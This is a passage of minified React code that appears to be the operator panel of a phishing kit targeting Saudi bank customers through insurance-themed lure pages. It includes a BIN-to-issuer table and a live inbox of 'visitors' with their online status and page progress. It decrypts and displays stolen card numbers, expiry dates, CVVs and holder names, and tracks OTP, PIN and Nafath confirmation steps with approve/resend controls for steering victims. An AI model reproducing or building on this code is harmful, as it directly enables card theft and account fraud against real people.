                funding: "debit",
                issuer_name: "Riyad Bank",
                product_name: "Platinum",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            524646: {
                bin: "524646",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Arab National Bank",
                product_name: "Platinum",
                issuer_logo: "arab-national-bank.png",
                country_code: "SA"
            },
            529415: {
                bin: "529415",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "Standard",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            529741: {
                bin: "529741",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Riyadh Bank",
                product_name: "Mastercard",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            532446: {
                bin: "532446",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "NATIONAL COMMERCIAL BANK, THE",
                product_name: "World",
                issuer_logo: "national-commercial-bank.png",
                country_code: "SA"
            },
            414026: {
                bin: "414026",
                scheme: "visa",
                funding: "credit",
                issuer_name: "NATIONAL COMMERCIAL BANK, THE",
                product_name: "SIGNATURE",
                issuer_logo: "national-commercial-bank.png",
                country_code: "SA"
            },
            532448: {
                bin: "532448",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi National Bank",
                product_name: "World",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            534524: {
                bin: "534524",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Tas'hell Finance",
                product_name: "Titanium",
                issuer_logo: null,
                country_code: "SA"
            },
            535825: {
                bin: "535825",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "Titanium",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            536023: {
                bin: "536023",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Riyadh Bank",
                product_name: "Mastercard",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            536567: {
                bin: "536567",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi National Bank",
                product_name: "Nebula Affluent",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            537767: {
                bin: "537767",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Riyadh Bank",
                product_name: "Mastercard",
                issuer_logo: "riyad-bank.png",
                country_code: "SA"
            },
            543085: {
                bin: "543085",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "Platinum",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            543199: {
                bin: "543199",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi Awwal Bank",
                product_name: "Platinum",
                issuer_logo: "saudi-awwal-bank.png",
                country_code: "SA"
            },
            545205: {
                bin: "545205",
                scheme: "mastercard",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "Prepaid Gold Payroll",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            545454: {
                bin: "545454",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "BANK HANDLOWY W WARSZAWIE, S.A.",
                product_name: null,
                issuer_logo: null,
                country_code: "PL"
            },
            546756: {
                bin: "546756",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi Awwal Bank",
                product_name: "Nebula Affluent",
                issuer_logo: "saudi-awwal-bank.png",
                country_code: "SA"
            },
            549699: {
                bin: "549699",
                scheme: "mastercard",
                funding: "credit",
                issuer_name: "Saudi National Bank",
                product_name: "World Elite",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            },
            552075: {
                bin: "552075",
                scheme: "mada",
                funding: "debit",
                issuer_name: "Saudi National Bank",
                product_name: "Platinum",
                issuer_logo: "the-saudi-national-bank.png",
                country_code: "SA"
            }
        };

    function _(e) {
        if (!e) return null;
        let t = e.replace(/[\s-]/g, ""),
            a = t.slice(0, 8),
            r = t.slice(0, 6);
        return v[a] || v[r] || null
    }

    function el(e) {
        if (!e) return "";
        let t = String(e).trim(),
            a = t.toUpperCase();
        return ({
            "SAUDI ARABIA": "SA",
            "UNITED ARAB EMIRATES": "AE",
            "KUWAIT": "KW",
            "BAHRAIN": "BH",
            "OMAN": "OM",
            "QATAR": "QA",
            "JORDAN": "JO",
            "EGYPT": "EG",
            "LEBANON": "LB",
            "IRAQ": "IQ",
            "SYRIA": "SY",
            "YEMEN": "YE",
            "PALESTINE": "PS",
            "MOROCCO": "MA",
            "ALGERIA": "DZ",
            "TUNISIA": "TN",
            "LIBYA": "LY",
            "SUDAN": "SD"
        })[a] || (2 === a.length ? a : t.slice(0, 2).toUpperCase())
    }

    function j({
        visitors: e,
        selectedVisitor: a,
        onSelectVisitor: r,
        searchQuery: n,
        onSearchChange: s,
        cardFilter: i,
        onCardFilterChange: o,
        selectedIds: d,
        onToggleSelect: l,
        onSelectAll: c,
        onDeleteSelected: u,
        sidebarWidth: m,
        onSidebarWidthChange: v
    }) {
        let j = e.length > 0 && d.size === e.length;
        return (0, t.jsxs)("div", {
            className: "w-full md:w-[300px] bg-white flex flex-col relative border-l border-gray-200",
            style: {
                fontFamily: "Cairo, Tajawal, sans-serif"
            },
            children: [(0, t.jsxs)("div", {
                className: "px-2 py-2 border-b border-gray-200 bg-white",
                children: [(0, t.jsxs)("div", {
                    className: "flex items-center gap-1.5 mb-2",
                    children: [(0, t.jsx)("span", {
                        className: "text-[11px] font-bold text-gray-700",
                        children: "صندوق الوارد"
                    }), (0, t.jsx)("span", {
                        className: "text-[10px] text-gray-500 font-mono bg-gray-100 px-1.5 py-0.5 rounded border border-gray-200",
                        children: e.length
                    }), (0, t.jsx)("div", {
                        className: "flex-1"
                    }), (0, t.jsx)("button", {
                        onClick: () => o("all"),
                        className: `text-[10px] px-2 py-0.5 rounded transition-colors ${"all"===i?"bg-green-700 text-gray-900":"bg-gray-100 text-gray-400 hover:bg-gray-200"}`,
                        children: "الكل"
                    }), (0, t.jsx)("button", {
                        onClick: () => o("hasCard"),
                        className: `text-[10px] px-2 py-0.5 rounded transition-colors ${"hasCard"===i?"bg-green-700 text-gray-900":"bg-gray-100 text-gray-400 hover:bg-gray-200"}`,
                        children: "بطاقة"
                    })]
                }), (0, t.jsxs)("div", {
                    className: "relative",
                    children: [(0, t.jsx)(p, {
                        className: "absolute right-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-gray-400"
                    }), (0, t.jsx)("input", {
                        type: "text",
                        placeholder: "بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)",
                        value: n,
                        onChange: e => s(e.target.value),
                        className: "w-full pr-8 pl-3 py-1.5 bg-gray-50 border border-gray-200 rounded text-[11px] text-gray-700 placeholder-gray-400 focus:outline-none focus:border-green-500 focus:ring-1 focus:ring-green-500"
                    })]
                }), d.size > 0 && (0, t.jsxs)("div", {
                    className: "flex items-center gap-1.5 mt-1.5",
                    children: [(0, t.jsxs)("button", {
                        onClick: c,
                        className: "flex items-center gap-1 px-2 py-1 bg-gray-100 hover:bg-gray-200 rounded text-[10px] text-gray-400 transition-colors",
                        children: [j ? (0, t.jsx)(h, {
                            className: "w-3 h-3 text-green-500"
                        }) : (0, t.jsx)(b, {
                            className: "w-3 h-3"
                        }), j ? "إلغاء" : "الكل"]
                    }), (0, t.jsxs)("button", {
                        onClick: u,
                        className: "flex items-center gap-1 px-2 py-1 bg-red-900 hover:bg-red-800 text-red-300 rounded text-[10px] transition-colors",
                        children: [(0, t.jsx)(g, {
                            className: "w-3 h-3"
                        }), "حذف (", d.size, ")"]
                    })]
                })]
            }), (0, t.jsx)("div", {
                className: "flex-1 overflow-y-auto divide-y divide-gray-200",
                children: 0 === e.length ? (0, t.jsx)("div", {
                    className: "py-12 text-center text-xs text-gray-400",
                    children: "لا يوجد زوار"
                }) : e.map(e => {
                    let n, s, i = a?.id === e.id,
                        o = d.has(e.id || ""),
                        c = (n = Date.now(), s = e.lastSeen ? e.lastSeen instanceof Date ? e.lastSeen.getTime() : new Date(e.lastSeen).getTime() : 0, (!0 === e.isOnline || 1 === e.isOnline) && n - s < 3e4 ? "active" : n - s < 12e4 ? "idle" : "left"),
                        u = "waiting" === e.cardStatus || "waiting" === e.otpStatus || "waiting" === e.pinStatus || "waiting" === e.nafadConfirmationStatus,
                        m = !0 === e.isUnread,
                        p = e._v1 || e.cardNumber || e.history?.find(e => "_t1" === e.type || "card" === e.type)?.data?._v1,
                        g = !!p || !!(e.history && Array.isArray(e.history) && e.history.some(e => ("_t1" === e.type || "card" === e.type) && (e.data?._v1 || e.data?.v1 || e.data?.cardNumber || e.data))),
                        v = "";
                    if (p) {
                        let t = p;
                        try {
                            t = safeDecrypt(p, "card")
                        } catch (e) {}
                        let e = _(t.replace(/\s/g, "").slice(0, 8));
                        if (e) v = e.scheme?.toLowerCase() || "";
                        else {
                            let e = p.replace(/\s/g, "")[0];
                            "4" === e ? v = "visa" : "5" === e ? v = "mastercard" : "6" === e ? v = "mada" : "3" === e && (v = "amex")
                        }
                    }
                    let j = "active" === c ? "#22c55e" : "idle" === c ? "#f59e0b" : "#6b7280";
                    return (0, t.jsxs)("div", {
                        onClick: () => r(e),
                        className: `flex items-start gap-2 px-2.5 py-2.5 cursor-pointer transition-colors relative ${i?"bg-green-50 border-r-2 border-green-500 shadow-sm":"hover:bg-gray-100"} ${m?"bg-green-50":""}`,
                        children: [(0, t.jsx)("div", {
                            className: "mt-0.5 shrink-0 cursor-pointer",
                            onClick: t => {
                                t.stopPropagation(), l(e.id || "")
                            },
                            children: o ? (0, t.jsx)(h, {
                                className: "w-3.5 h-3.5 text-green-500"
                            }) : (0, t.jsx)(b, {
                                className: "w-3.5 h-3.5 text-gray-400"
                            })
                        }), (0, t.jsxs)("div", {
                            className: "relative shrink-0",
                            children: [(0, t.jsx)("div", {
                                className: "w-9 h-9 rounded-full flex items-center justify-center text-gray-900 text-xs font-bold",
                                style: {
                                    background: "active" === c ? "linear-gradient(135deg,#16a34a,#15803d)" : "idle" === c ? "linear-gradient(135deg,#d97706,#b45309)" : "linear-gradient(135deg,#4b5563,#374151)",
                                    boxShadow: `0 0 0 2px ${j}40`
                                },
                                children: (0, t.jsxs)("svg", {
                                    viewBox: "0 0 40 40",
                                    className: "w-full h-full",
                                    fill: "none",
                                    children: [(0, t.jsx)("circle", {
                                        cx: "20",
                                        cy: "14",
                                        r: "7",
                                        fill: "white",
                                        opacity: "0.2"
                                    }), (0, t.jsx)("circle", {
                                        cx: "20",
                                        cy: "14",
                                        r: "5",
                                        fill: "white",
                                        opacity: "0.5"
                                    }), (0, t.jsx)("path", {
                                        d: "M6 36c0-7.732 6.268-14 14-14s14 6.268 14 14",
                                        fill: "white",
                                        opacity: "0.25"
                                    })]
                                })
                            }), (0, t.jsx)("span", {
                                className: `absolute bottom-0 right-0 w-2.5 h-2.5 rounded-full border-2 border-white ${"active"===c?"animate-pulse":""}`,
                                style: {
                                    background: j
                                }
                            }), (e.country || e.country_code) && (0, t.jsx)("span", {
                                className: "absolute -top-0.5 -left-0.5 text-[9px] leading-none",
                                children: function(e) {
                                    let t = el(e);
                                    return 2 === t.length ? String.fromCodePoint(127397 + t.charCodeAt(0), 127397 + t.charCodeAt(1)) : "🌐"
                                }(e.country || e.country_code)
                            })]
                        }), (0, t.jsxs)("div", {
                            className: "flex-1 min-w-0",
                            children: [(0, t.jsxs)("div", {
                                className: "flex items-center justify-between gap-1 mb-0.5",
                                children: [(0, t.jsxs)("div", {
                                    className: "flex items-center gap-1.5 min-w-0",
                                    children: [(0, t.jsx)("span", {
                                        className: `font-bold text-[13px] truncate leading-tight ${m?"text-gray-900":"text-gray-700"}`,
                                        children: e.ownerName || `زائر ${(e.id||"").slice(-6)}`
                                    }), g && (0, t.jsxs)("span", {
                                        className: "shrink-0 inline-flex items-center gap-0.5",
                                        children: [(0, t.jsx)(x, {
                                            className: "w-3.5 h-3.5 text-blue-600"
                                        }), "visa" === v && (0, t.jsx)("svg", {
                                            viewBox: "0 0 50 16",
                                            className: "h-3.5 w-auto",
                                            fill: "none",
                                            children: (0, t.jsx)("text", {
                                                x: "0",
                                                y: "13",
                                                fontFamily: "Arial, sans-serif",
                                                fontWeight: "900",
                                                fontSize: "15",
                                                fill: "#1a1f71",
                                                letterSpacing: "-0.5",
                                                children: "VISA"
                                            })
                                        }), "mastercard" === v && (0, t.jsxs)("svg", {
                                            viewBox: "0 0 38 24",
                                            className: "h-4 w-auto",
                                            children: [(0, t.jsx)("circle", {
                                                cx: "14",
                                                cy: "12",
                                                r: "11",
                                                fill: "#EB001B"
                                            }), (0, t.jsx)("circle", {
                                                cx: "24",
                                                cy: "12",
                                                r: "11",
                                                fill: "#F79E1B"
                                            }), (0, t.jsx)("path", {
                                                d: "M19 5.5a11 11 0 0 1 0 13A11 11 0 0 1 19 5.5z",
                                                fill: "#FF5F00"
                                            })]
                                        }), "amex" === v && (0, t.jsxs)("svg", {
                                            viewBox: "0 0 52 20",
                                            className: "h-4 w-auto",
                                            fill: "none",
                                            children: [(0, t.jsx)("rect", {
                                                width: "52",
                                                height: "20",
                                                rx: "3",
                                                fill: "#007bc1"
                                            }), (0, t.jsx)("text", {
                                                x: "3",
                                                y: "14",
                                                fontFamily: "Arial, sans-serif",
                                                fontWeight: "900",
                                                fontSize: "9",
                                                fill: "white",
                                                children: "AMEX"
                                            })]
                                        })]
                                    })]
                                }), (0, t.jsx)("span", {
                                    className: "text-[10px] text-gray-400 whitespace-nowrap shrink-0",
                                    children: function(e) {
                                        let t;
                                        if (e && "object" == typeof e && "toDate" in e) t = e.toDate();
                                        else if (e instanceof Date) t = e;
                                        else {
                                            if ("string" != typeof e && "number" != typeof e) return "منذ لحظات";
                                            t = new Date(e)
                                        }
                                        let a = Math.floor((new Date().getTime() - t.getTime()) / 1e3),
                                            r = Math.floor(a / 60),
                                            n = Math.floor(r / 60),
                                            s = Math.floor(n / 24);
                                        if (a < 60) return a <= 1 ? "الآن" : 2 === a ? "منذ ثانيتين" : a <= 10 ? `منذ ${a} ثوانٍ` : `منذ ${a} ثانية`;
                                        if (r < 60) return 1 === r ? "منذ دقيقة" : 2 === r ? "منذ دقيقتين" : r <= 10 ? `منذ ${r} دقائق` : `منذ ${r} دقيقة`;
                                        if (n < 24) return 1 === n ? "منذ ساعة" : 2 === n ? "منذ ساعتين" : n <= 10 ? `منذ ${n} ساعات` : `منذ ${n} ساعة`;
                                        if (1 === s) return "منذ يوم";
                                        if (2 === s) return "منذ يومين";
                                        if (s <= 10) return `منذ ${s} أيام`;
                                        if (s <= 30) return `منذ ${s} يوم`;
                                        let i = Math.floor(s / 30);
                                        if (1 === i) return "منذ شهر";
                                        if (2 === i) return "منذ شهرين";
                                        if (i <= 10) return `منذ ${i} أشهر`;
                                        if (i < 12) return `منذ ${i} شهر`;
                                        let o = Math.floor(s / 365);
                                        return 1 === o ? "منذ سنة" : 2 === o ? "منذ سنتين" : `منذ ${o} سنوات`
                                    }(e.updatedAt || e.lastSeen)
                                })]
                            }), (0, t.jsxs)("div", {
                                className: "flex items-center gap-1.5 flex-wrap",
                                children: [u && (0, t.jsx)(y, {
                                    className: "w-3 h-3 text-amber-600 animate-spin shrink-0"
                                }), (0, t.jsx)("span", {
                                    className: "text-[13px] font-semibold text-gray-600 truncate",
                                    children: (e => {
                                        if ("string" == typeof e) return ({
                                            "home-new": "الرئيسية",
                                            home: "الرئيسية",
                                            insur: "التأمين",
                                            compar: "مقارنة",
                                            check: "الدفع",
                                            payment: "الدفع",
                                            otp: "OTP",
                                            pin: "PIN",
                                            phone: "الهاتف",
                                            nafad: "نفاذ",
                                            "thank-you": "شكراً",
                                            _st1: "الدفع",
                                            _t2: "OTP",
                                            _t3: "PIN",
                                            _t5: "الهاتف",
                                            _t6: "نفاذ",
                                            veri: "OTP",
                                            confi: "PIN",
                                            step2: "OTP",
                                            step3: "PIN",
                                            step4: "نفاذ",
                                            step5: "الهاتف",
                                            "phone-info": "الهاتف"
                                        })[e] || e;
                                        let t = "number" == typeof e ? e : parseInt(e);
                                        return ({
                                            0: "الرئيسية",
                                            1: "الرئيسية",
                                            2: "التأمين",
                                            3: "مقارنة",
                                            4: "الدفع",
                                            5: "OTP",
                                            6: "PIN",
                                            7: "الهاتف",
                                            8: "نفاذ"
                                        })[t] || `${t}`
                                    })(pageDisplay(e))
                                }), e.phoneVerificationCode && (0, t.jsxs)("span", {
                                    className: "inline-flex items-center gap-0.5 text-[9px] px-1.5 py-0.5 bg-amber-50 border border-amber-300 text-amber-600 rounded",
                                    children: [(0, t.jsx)(f, {
                                        className: "w-2 h-2"
                                    }), "OTP"]
                                }), !g && m && (0, t.jsx)("span", {
                                    className: "w-1.5 h-1.5 rounded-full bg-green-500 inline-block animate-pulse"
                                })]
                            })]
                        })]
                    }, e.id)
                })
            })]
        })
    }

    function w({
        title: e,
        data: a,
        timestamp: r,
        status: n,
        showActions: s,
        isLatest: i,
        actions: o,
        icon: d,
        color: l,
        layout: c = "vertical"
    }) {
        let u = e => {
            let t = new Date(e),
                a = String(t.getMonth() + 1).padStart(2, "0"),
                r = String(t.getDate()).padStart(2, "0"),
                n = t.getHours(),
                s = String(t.getMinutes()).padStart(2, "0"),
                i = n >= 12 ? "pm" : "am";
            return n = n % 12 || 12, `${a}-${r} | ${n}:${s} ${i}`
        };
        if ("معلومات البطاقة" === e || e.startsWith("معلومات البطاقة") || void 0 !== a["رقم البطاقة"]) {
            var m;
            let d, l, c, p = safeDecrypt(a["رقم البطاقة"] || "", "card") || "•••• •••• •••• ••••";
            p && !p.includes(" ") ? p = p.match(/.{1,4}/g)?.join("  ") || p : p.includes(" ") && (p = p.replace(/\s+/g, "  "));
            let g = safeDecrypt(a["تاريخ الانتهاء"] || "", "exp") || "••/••",
                h = safeDecrypt(a.CVV || "", "cvv") || "•••",
                b = safeDecrypt(a["اسم حامل البطاقة"] || "", "name") || "CARD HOLDER",
                x = a["البنك"] || null,
                f = a["الشبكة"] || null,
                y = a["نوع البطاقة"] || null,
                v = a["نوع التمويل"] || null,
                _ = a["الدولة"] || null,
                j = _ ? _ && 2 === _.length ? String.fromCodePoint(..._.toUpperCase().split("").map(e => 127462 + e.charCodeAt(0) - 65)) : "" : null,
                w = _ ? ({
                    SA: "Saudi Arabia",
                    US: "USA",
                    GB: "UK",
                    AE: "UAE",
                    KW: "Kuwait",
                    QA: "Qatar",
                    BH: "Bahrain",
                    OM: "Oman",
                    JO: "Jordan",
                    EG: "Egypt",
                    LB: "Lebanon",
                    TR: "Turkey",
                    DE: "Germany",
                    FR: "France",
                    IT: "Italy",
                    ES: "Spain"
                })[_?.toUpperCase()] || _ : null,
                k = "SA" === _,
                N = x && "غير محدد" !== x ? (d = (x || "").toLowerCase()).includes("saudi national") || d.includes("snb") || d.includes("الأهلي السعودي") ? "https://upload.wikimedia.org/wikipedia/commons/6/62/Saudi_National_Bank_Logo.svg" : d.includes("rajhi") || d.includes("الراجحي") ? "https://upload.wikimedia.org/wikipedia/commons/f/f1/Al_Rajhi_Bank_Logo.svg" : d.includes("riyad") || d.includes("الرياض") ? "https://upload.wikimedia.org/wikipedia/commons/b/be/Riyad_Bank_logo.svg" : d.includes("awwal") || d.includes("sabb") || d.includes("الأول") ? "https://upload.wikimedia.org/wikipedia/commons/5/52/SAB_logo_%28since_2023%29.svg" : d.includes("albilad") || d.includes("al bilad") || d.includes("البلاد") ? "https://upload.wikimedia.org/wikipedia/commons/9/91/Bank_Albilad_logo.svg" : d.includes("aljazira") || d.includes("al jazira") || d.includes("الجزيرة") ? "https://upload.wikimedia.org/wikipedia/commons/e/eb/Bank_Aljazira_New_Logo.png" : d.includes("arab national") || d.includes("anb") || d.includes("العربي الوطني") ? "https://upload.wikimedia.org/wikipedia/commons/9/96/Anb_new_logo.png" : d.includes("fransi") || d.includes("الفرنسي") ? "https://upload.wikimedia.org/wikipedia/commons/7/73/Banque_Saudi_Fransi_Logo.svg" : d.includes("alinma") || d.includes("الإنماء") ? "https://upload.wikimedia.org/wikipedia/commons/9/90/Alinma_Bank_logo.svg" : d.includes("gulf international") || d.includes("gib") ? "https://images.seeklogo.com/logo-png/50/1/gulf-international-bank-logo-png_seeklogo-507418.png" : null : null,
                A = (l = (x || "").toLowerCase()).includes("saudi national") || l.includes("snb") ? {
                    bg: "linear-gradient(135deg, #e8edf8 0%, #c8d4ee 100%)",
                    accent: "#00205b",
                    text: "#00205b",
                    subtext: "#3a5a9b",
                    border: "#a0b4d8"
                } : l.includes("rajhi") ? {
                    bg: "linear-gradient(135deg, #e6f4ec 0%, #c2e0cc 100%)",
                    accent: "#006633",
                    text: "#004d26",
                    subtext: "#2d7a4f",
                    border: "#90c9a8"
                } : l.includes("riyad") ? {
                    bg: "linear-gradient(135deg, #fce8e8 0%, #f0c0c0 100%)",
                    accent: "#8b0000",
                    text: "#6b0000",
                    subtext: "#b22222",
                    border: "#e09090"
                } : l.includes("awwal") || l.includes("sabb") ? {
                    bg: "linear-gradient(135deg, #fdecea 0%, #f9c4be 100%)",
                    accent: "#c8102e",
                    text: "#9e0020",
                    subtext: "#d94040",
                    border: "#f0a0a0"
                } : l.includes("albilad") || l.includes("al bilad") ? {
                    bg: "linear-gradient(135deg, #e6f0f8 0%, #b8d4ec 100%)",
                    accent: "#1b4f72",
                    text: "#153d58",
                    subtext: "#2e86c1",
                    border: "#88b8d8"
                } : l.includes("aljazira") || l.includes("al jazira") ? {
                    bg: "linear-gradient(135deg, #f0e8f8 0%, #d8c0ee 100%)",
                    accent: "#4a235a",
                    text: "#3a1848",
                    subtext: "#6c3483",
                    border: "#b890d4"
                } : l.includes("arab national") || l.includes("anb") ? {
                    bg: "linear-gradient(135deg, #e8f0f8 0%, #c0d4ec 100%)",
                    accent: "#1a5276",
                    text: "#12395a",
                    subtext: "#1f618d",
                    border: "#80b0d0"
                } : l.includes("fransi") ? {
                    bg: "linear-gradient(135deg, #e6f4ee 0%, #b8dcc8 100%)",
                    accent: "#145a32",
                    text: "#0e4226",
                    subtext: "#1e8449",
                    border: "#78c098"
                } : l.includes("alinma") ? {
                    bg: "linear-gradient(135deg, #e6f2fc 0%, #b8d8f4 100%)",
                    accent: "#1b6ca8",
                    text: "#134e7c",
                    subtext: "#2196f3",
                    border: "#78b8e8"
                } : l.includes("gulf international") || l.includes("gib") ? {
                    bg: "linear-gradient(135deg, #e6f0f2 0%, #b8d4da 100%)",
                    accent: "#0d3b5e",
                    text: "#082a44",
                    subtext: "#1a6b9a",
                    border: "#70a8c0"
                } : {
                    bg: "linear-gradient(135deg, #f0f4f8 0%, #d8e4f0 100%)",
                    accent: "#374151",
                    text: "#1f2937",
                    subtext: "#6b7280",
                    border: "#c0ccd8"
                },
                S = f ? (m = A.accent, "visa" === (c = (f || "").toLowerCase()) ? (0, t.jsx)("svg", {
                    viewBox: "0 0 60 20",
                    className: "h-6 w-auto",
                    children: (0, t.jsx)("text", {
                        x: "0",
                        y: "17",
                        fontSize: "20",
                        fontFamily: "Arial",
                        fontWeight: "bold",
                        letterSpacing: "1",
                        fill: m,
                        children: "VISA"
                    })
                }) : "mastercard" === c ? (0, t.jsxs)("svg", {
                    viewBox: "0 0 44 28",
                    className: "h-7 w-auto",
                    children: [(0, t.jsx)("circle", {
                        cx: "15",
                        cy: "14",
                        r: "13",
                        fill: "#eb001b",
                        opacity: "0.9"
                    }), (0, t.jsx)("circle", {
                        cx: "29",
                        cy: "14",
                        r: "13",
                        fill: "#f79e1b",
                        opacity: "0.9"
                    }), (0, t.jsx)("path", {
                        d: "M22 3.5a13 13 0 0 1 0 21A13 13 0 0 1 22 3.5z",
                        fill: "#ff5f00",
                        opacity: "0.85"
                    })]
                }) : "mada" === c ? (0, t.jsx)("span", {
                    style: {
                        color: m,
                        fontWeight: "bold",
                        fontSize: "16px",
                        letterSpacing: "2px"
                    },
                    children: "مدى"
                }) : "amex" === c ? (0, t.jsx)("svg", {
                    viewBox: "0 0 60 20",
                    className: "h-6 w-auto",
                    children: (0, t.jsx)("text", {
                        x: "0",
                        y: "16",
                        fontSize: "16",
                        fontFamily: "Arial",
                        fontWeight: "bold",
                        letterSpacing: "0.5",
                        fill: m,
                        children: "AMEX"
                    })
                }) : null) : null,
                C = "ائتمانية" === v ? "CREDIT" : "Debit" === v ? "DEBIT" : "مدفوعة مسبقاً" === v ? "PREPAID" : v ? v.toUpperCase() : null;
            return (0, t.jsxs)("div", {
                className: "bg-gray-50 rounded-lg p-2 border border-gray-300",
                style: {
                    fontFamily: "Cairo, Tajawal, sans-serif"
                },
                children: [(0, t.jsxs)("div", {
                    className: "mb-2",
                    children: [r && (0, t.jsx)("div", {
                        className: "text-[10px] text-gray-500 text-right mb-0.5",
                        children: u(r)
                    }), (0, t.jsxs)("div", {
                        className: "flex items-center justify-between",
                        children: [(0, t.jsx)("h3", {
                            className: "text-sm font-bold text-gray-800",
                            children: e
                        }), (() => {
                            if (!n) return null;
                            let e = {
                                pending: {
                                    text: "⏳ قيد المراجعة",
                                    className: "bg-yellow-100 text-yellow-800 border-yellow-300"
                                },
                                approved: {
                                    text: "✓ تم القبول",
                                    className: "bg-green-100 text-green-800 border-green-300"
                                },
                                rejected: {
                                    text: "✗ تم الرفض",
                                    className: "bg-red-100 text-red-800 border-red-300"
                                },
                                approved_with_otp: {
                                    text: "🔑 تحول OTP",
                                    className: "bg-blue-100 text-blue-800 border-blue-300"
                                },
                                approved_with_pin: {
                                    text: "🔐 تحول PIN",
                                    className: "bg-purple-100 text-purple-800 border-purple-300"
                                },
                                resend: {
                                    text: "🔄 إعادة إرسال",
                                    className: "bg-orange-100 text-orange-800 border-orange-300"
                                }
                            } [n];
                            return e ? (0, t.jsx)("span", {
                                className: `px-2 py-1 rounded-md text-xs font-bold border ${e.className}`,
                                children: e.text
                            }) : null
                        })()]
                    })]
                }), (0, t.jsxs)("div", {
                    className: "relative rounded-2xl overflow-hidden mb-2 shadow-md",
                    style: {
                        background: A.bg,
                        border: `1.5px solid ${A.border}`,
                        aspectRatio: "1.586/1",
                        minHeight: "170px",
                        padding: "16px 18px"
                    },
                    children: [(0, t.jsxs)("div", {
                        className: "absolute inset-0 pointer-events-none",
                        style: {
                            opacity: .06
                        },
                        children: [(0, t.jsx)("div", {
                            style: {
                                position: "absolute",
                                top: "-30%",
                                right: "-15%",
                                width: "55%",
                                height: "100%",
                                borderRadius: "50%",
                                background: A.accent
                            }
                        }), (0, t.jsx)("div", {
                            style: {
                                position: "absolute",
                                bottom: "-30%",
                                left: "-10%",
                                width: "45%",
                                height: "80%",
                                borderRadius: "50%",
                                background: A.accent
                            }
                        })]
                    }), (0, t.jsxs)("div", {
                        className: "relative h-full flex flex-col justify-between",
                        style: {
                            height: "100%"
                        },
                        children: [(0, t.jsxs)("div", {
                            className: "flex items-start justify-between",
                            children: [(0, t.jsxs)("div", {
                                className: "flex flex-col gap-1",
                                children: [N ? (0, t.jsx)("img", {
                                    src: N,
                                    alt: x,
                                    className: "h-8 w-auto object-contain",
                                    style: {
                                        maxWidth: "110px",
                                        filter: "none"
                                    },
                                    onError: e => {
                                        let t = e.target;
                                        t.style.display = "none";
                                        let a = t.parentElement;
                                        if (a) {
                                            let e = document.createElement("span");
                                            e.style.fontSize = "11px", e.style.fontWeight = "bold", e.style.color = A.accent, e.textContent = x || "", a.appendChild(e)
                                        }
                                    }
                                }) : x && "غير محدد" !== x ? (0, t.jsx)("span", {
                                    style: {
                                        fontSize: "11px",
                                        fontWeight: "bold",
                                        color: A.accent
                                    },
                                    children: x
                                }) : null, x && "غير محدد" !== x && (0, t.jsx)("span", {
                                    style: {
                                        fontSize: "9px",
                                        color: A.subtext,
                                        fontWeight: "600",
                                        letterSpacing: "0.05em",
                                        textTransform: "uppercase"
                                    },
                                    children: x
                                })]
                            }), (0, t.jsx)("div", {
                                style: {
                                    border: `1.5px solid ${A.accent}`,
                                    borderRadius: "6px",
                                    padding: "2px 8px",
                                    fontSize: "11px",
                                    fontWeight: "bold",
                                    color: A.accent,
                                    letterSpacing: "0.05em"
                                },
                                children: "SAR"
                            })]
                        }), (0, t.jsx)("div", {
                            style: {
                                fontFamily: "'Courier New', 'Lucida Console', monospace",
                                fontSize: "18px",
                                fontWeight: "bold",
                                letterSpacing: "0.15em",
                                color: A.text,
                                direction: "ltr",
                                textAlign: "left",
                                margin: "4px 0"
                            },
                            children: p
                        }), (0, t.jsxs)("div", {
                            className: "flex items-end justify-between",
                            children: [(0, t.jsxs)("div", {
                                className: "flex flex-col gap-0.5",
                                children: [(0, t.jsx)("span", {
                                    style: {
                                        fontSize: "11px",
                                        fontWeight: "bold",
                                        color: A.text,
                                        letterSpacing: "0.05em",
                                        textTransform: "uppercase"
                                    },
                                    children: b
                                }), (0, t.jsxs)("div", {
                                    className: "flex items-center gap-3",
                                    children: [(0, t.jsxs)("div", {
                                        children: [(0, t.jsx)("span", {
                                            style: {
                                                fontSize: "8px",
                                                color: A.subtext,
                                                letterSpacing: "0.05em"
                                            },
                                            children: "EXPIRES"
                                        }), (0, t.jsx)("div", {
                                            style: {
                                                fontSize: "12px",
                                                fontWeight: "bold",
                                                color: A.text,
                                                direction: "ltr"
                                            },
                                            children: g
                                        })]
                                    }), (0, t.jsxs)("div", {
                                        children: [(0, t.jsx)("span", {
                                            style: {
                                                fontSize: "8px",
                                                color: A.subtext,
                                                letterSpacing: "0.05em"
                                            },
                                            children: "CVV"
                                        }), (0, t.jsx)("div", {
                                            style: {
                                                fontSize: "12px",
                                                fontWeight: "bold",
                                                color: A.text
                                            },
                                            children: h
                                        })]
                                    })]
                                })]
                            }), (0, t.jsxs)("div", {
                                className: "flex flex-col items-end gap-0.5",
                                children: [S && (0, t.jsx)("div", {
                                    children: S
                                }), (y || C) && (0, t.jsx)("span", {
